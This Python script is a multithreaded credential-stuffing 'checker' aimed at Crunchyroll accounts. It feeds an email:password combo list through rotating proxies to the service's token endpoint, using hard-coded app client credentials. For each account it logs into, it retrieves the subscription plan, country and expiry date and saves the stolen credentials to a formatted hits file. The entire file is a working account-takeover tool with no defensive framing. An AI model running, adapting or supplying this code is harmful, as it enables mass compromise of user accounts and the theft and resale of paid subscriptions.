import requests
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# --- CONFIGURATION ---
COMBO_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
HITS_FILE = "hits.txt"
FREE_FILE = "free.txt"
THREADS = 50

# Global Stats & Locking
stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
print_lock = threading.Lock()

# Auth Constants
CLIENT_ID = "o7uowy7q4lgltbavyhjq"
CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"

# ISO Country Translation Table (Mapping from your config)
COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿", "AS": "American Samoa 🇦🇸",
    "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AR": "Argentina 🇦🇷", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹",
    "BR": "Brazil 🇧🇷", "CA": "Canada 🇨🇦", "FR": "France 🇫🇷", "DE": "Germany 🇩🇪", "IN": "India 🇮🇳",
    "IT": "Italy 🇮🇹", "JP": "Japan 🇯🇵", "MX": "Mexico 🇲🇽", "ES": "Spain 🇪🇸", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸" # ... (Add others from your list as needed)
}

def get_proxies():
    plist = []
    try:
        with open(PROXY_FILE, "r") as f:
            for line in f:
                p = line.strip().split(':')
                if len(p) == 4: # host:port:user:pass
                    plist.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
                else:
                    plist.append({"http": f"http://{line.strip()}", "https": f"http://{line.strip()}"})
        return plist if plist else [None]
    except: return [None]

def check(account, proxies):
    email, password = account.split(":", 1)
    proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
    session = requests.Session()
    
    headers = {
        "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        # 1. AUTHENTICATION
        data = {
            "grant_type": "password", "username": email, "password": password,
            "scope": "offline_access", "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "device_type": "SamsungTV", "device_id": str(uuid.uuid4()), "device_name": "Goku"
        }
        r1 = session.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers, proxies=proxy, timeout=10)
        
        if r1.status_code == 200:
            auth = r1.json()
            token = auth['access_token']
            pid = auth['profile_id']
            headers["Authorization"] = f"Bearer {token}"

            # 2. ACCOUNT DETAILS
            r2 = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, proxies=proxy, timeout=7).json()
            ev = r2.get("email_verified", "False")
            guid = r2.get("external_id")

            # 3. PLAN & COUNTRY
            r3 = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits", headers=headers, proxies=proxy, timeout=7).json()
            
            if r3.get("total", 0) > 0:
                country_code = r3.get("subscription_country", "Unknown")
                country_full = COUNTRY_MAP.get(country_code, country_code)
                
                # Plan Translation Logic
                raw_benefit = str(r3.get("items", []))
                if "streams.4" in raw_benefit: plan = "MEGA FAN MEMBER"
                elif "streams.6" in raw_benefit: plan = "ULTIMATE FAN MEMBER"
                elif "streams.1" in raw_benefit: plan = "FAN MEMBER"
                else: plan = "Premium"

                # 4. EXPIRY
                r4 = session.get(f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions", headers=headers, proxies=proxy, timeout=7).json()
                expiry = "N/A"
                rem_days = "0"
                
                if "nextRenewalDate" in str(r4):
                    for s in r4.get("subscriptions", []):
                        if s.get("nextRenewalDate"):
                            expiry = s["nextRenewalDate"].split("T")[0]
                            d1 = datetime.strptime(expiry, "%Y-%m-%d")
                            rem_days = str((d1 - datetime.now()).days)
                            break

                # --- CAPTURE BLOCK ---
                hit_info = (
                    f"╒════════════「✨ ʜɪᴛ ʙʏ Ƹ︻╦╤─ ҉ - PYTHON ✨\n\n"
                    f"│➖https://www.crunchyroll.com\n"
                    f"│➖credentials:{email}:{password}\n"
                    f"│➖Email:{email}\n"
                    f"│➖Password:{password}\n"
                    f"│➖Email verified {ev}\n"
                    f"│➖Plan:{plan}\n"
                    f"│➖Expiry:{expiry}\n"
                    f"│➖Remaining days:{rem_days}\n"
                    f"➖│Country:{country_full}\n"
                    f"│╘══════════════\n\n"
                )
                
                with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(hit_info)
                with print_lock: 
                    stats["hits"] += 1
                    print(f"[\033[92mHIT\033[0m] {email} | {plan} | {country_code}")
            else:
                with open(FREE_FILE, "a") as f: f.write(f"{email}:{password}\n")
                with print_lock: stats["free"] += 1
        else:
            with print_lock: stats["fail"] += 1
            
    except:
        with print_lock: stats["error"] += 1
    finally:
        with print_lock:
            stats["checked"] += 1
            if stats["checked"] % 10 == 0:
                print(f"[*] Checked: {stats['checked']} | Hits: {stats['hits']} | Free: {stats['free']}")

def main():
    proxies = get_proxies()
    with open(COMBO_FILE, "r") as f:
        accs = [l.strip() for l in f if ":" in l]

    print(f"[*] Starting: {len(accs)} accounts | {THREADS} Threads\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for a in accs:
            ex.submit(check, a, proxies)

if __name__ == "__main__":
    main()
